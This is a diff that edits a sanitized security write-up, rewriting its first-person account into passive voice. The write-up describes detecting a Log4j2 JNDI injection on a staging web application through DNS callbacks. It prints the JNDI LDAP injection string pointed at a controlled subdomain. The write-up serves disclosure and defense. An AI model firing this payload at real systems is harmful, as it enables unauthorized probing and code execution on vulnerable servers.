@@ -8,27 +8,27 @@ image: assets/images/23/LOG4j-image.png
 
 ## Introduction
 
-During security testing of a staging web application, I identified a potential **Remote Code Execution (RCE)** vulnerability associated with the **Log4j2** Java logging library.
+During security testing of a staging web application, a potential **Remote Code Execution (RCE)** vulnerability associated with the **Log4j2** Java logging library was identified.
 
 The affected environment was a staging web application, and the issue involved **Server-Side Injection > Remote Code Execution (RCE)**.
 
-The application processed a specially crafted JNDI LDAP payload and generated an outbound DNS request to infrastructure under my control.
+The application processed a specially crafted JNDI LDAP payload and generated an outbound DNS request to controlled infrastructure.
 
 > **Disclosure Note:** The identity of the affected organization, product name, domains, tenant information, and infrastructure-specific identifiers have been intentionally removed from this write-up. The purpose is to document the technical finding without exposing company-specific infrastructure. The screenshots should also be sanitized before publication.
 
 ## The Vulnerability
 
-The issue involved the **Log4j2 Java logging library**.
+The issue involved the **Log4j2 Java logging library** and its handling of JNDI references.
 
-During testing, I identified that the application was processing a specially crafted JNDI LDAP reference.
+During testing, the application was found to process a specially crafted JNDI LDAP reference.
 
-The testing technique used a controlled DNS subdomain to detect whether the application would initiate an external lookup when processing the supplied payload.
+A controlled DNS subdomain was used to determine whether the application would initiate an external lookup when processing the supplied payload.
 
-The observed DNS callback provided evidence that the supplied JNDI reference was being processed by the application's logging infrastructure.
+The observed DNS callback demonstrated that the supplied JNDI reference was being processed by the application's logging infrastructure.
 
 ## Reproduction
 
-I first generated a unique subdomain using a DNS monitoring service.
+A unique subdomain was generated using a DNS monitoring service.
 
 The generated subdomain was then incorporated into the following JNDI payload:
 
@@ -38,7 +38,7 @@ ${jndi:ldap://<controlled-subdomain>/a}
 
 For this sanitized write-up, the original DNSLog domain has been replaced with a generic controlled subdomain.
 
-I then submitted the payload through an application feature that generated a server-side log entry.
+The payload was then submitted through an application feature that generated a server-side log entry.
 
 ### Image 1
 
@@ -48,11 +48,11 @@ The screenshot shows the controlled DNS subdomain and the JNDI payload submitted
 
 ## DNS Request
 
-After submitting the payload, I returned to the DNS monitoring service and refreshed the records.
+After submitting the payload, the DNS monitoring service was checked for incoming requests.
 
 A DNS request associated with the generated subdomain was observed.
 
-This confirmed that the application had processed the supplied JNDI reference and initiated an outbound DNS lookup.
+This demonstrated that the application had processed the supplied JNDI reference and initiated an outbound DNS lookup.
 
 ### Image 2
 
@@ -64,7 +64,7 @@ The screenshot shows the DNS monitoring page during the verification process.
 
 Multiple DNS requests associated with the generated controlled subdomain were subsequently observed.
 
-The requests confirmed that the supplied JNDI payload was being processed by the application and that the application was making an external DNS request as a result.
+The requests demonstrated that the supplied JNDI payload was being processed by the application and that the application was making an external DNS request as a result.
 
 ### Image 3
 
@@ -77,7 +77,7 @@ The screenshot shows the DNS requests received for the controlled subdomain.
 The observed behavior can be summarized as:
 
 ```text
-Attacker-Controlled Input
+Controlled Test Input
           ↓
 JNDI LDAP Payload
           ↓
@@ -96,9 +96,9 @@ The DNS callback demonstrated that the supplied JNDI reference was processed and
 
 The successful DNS callback demonstrated that the application was processing the crafted JNDI payload through the Log4j2 logging component.
 
-This behavior was consistent with the Log4j2 JNDI injection vulnerability.
+This behavior was consistent with the **Log4j2 JNDI injection vulnerability**.
 
-The observed callback confirmed the JNDI lookup behavior. A DNS callback alone does not independently demonstrate arbitrary code execution, so the result is described as confirmation of the vulnerable JNDI processing behavior rather than proof of full RCE.
+The observed callback confirmed the JNDI lookup behavior. However, a DNS callback alone does not independently demonstrate arbitrary code execution. Therefore, the demonstrated result is described as confirmation of vulnerable JNDI processing rather than proof of full RCE.
 
 ## Severity
 
@@ -112,11 +112,13 @@ The issue falls under:
 
 ## Key Takeaway
 
-During testing, I identified that the application processed a specially crafted JNDI LDAP payload and generated an outbound DNS request.
+The application processed a specially crafted JNDI LDAP payload and generated an outbound DNS request to controlled infrastructure.
 
-The callback confirmed that the supplied JNDI reference was being processed by the application's logging functionality.
+The callback demonstrated that the supplied JNDI reference was being processed by the application's logging functionality.
 
-This demonstrates the security impact that vulnerable Log4j2 deployments can introduce when attacker-controlled input reaches the affected logging component.
+This demonstrates the security impact that vulnerable Log4j2 deployments can introduce when untrusted input reaches the affected logging component.
+
+The finding highlights the importance of identifying vulnerable Log4j2 deployments, keeping affected components patched, and preventing untrusted input from reaching vulnerable JNDI functionality.
 
 ## Responsible Disclosure and Sanitization
 
@@ -130,9 +132,9 @@ Any company names, real domains, IP addresses, tenant identifiers, usernames, ti
 
 ## Conclusion
 
-During security testing of a staging web application, I identified Log4j2 JNDI processing through a specially crafted LDAP payload.
+Security testing of a staging web application identified Log4j2 JNDI processing through a specially crafted LDAP payload.
 
-By using a controlled DNS subdomain and monitoring for outbound requests, I was able to observe DNS callbacks generated after the payload was processed.
+A controlled DNS subdomain was used to monitor for outbound requests, and DNS callbacks were observed after the payload was processed.
 
 This provided evidence that the application was processing the supplied JNDI reference through its logging infrastructure.
 
